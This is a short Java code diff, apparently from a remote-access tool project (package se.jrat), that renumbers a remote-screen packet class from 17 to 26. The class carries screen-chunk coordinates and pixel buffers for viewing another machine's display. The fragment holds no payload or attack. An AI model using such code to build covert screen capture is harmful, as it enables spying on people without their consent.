@@ -4,7 +4,7 @@ import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
 
-public class Packet17RemoteScreen extends AbstractOutgoingPacket {
+public class Packet26RemoteScreen extends AbstractOutgoingPacket {
 
 	private int chunkWidth;
 	private int chunkHeight;
@@ -14,7 +14,7 @@ public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 	private int height;
 	private byte[] buffer;
 
-	public Packet17RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
+	public Packet26RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
 		this.chunkWidth = w;
 		this.chunkHeight = h;
 		this.x = x;
@@ -39,7 +39,7 @@ public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return 17;
+		return 26;
 	}
 
 }
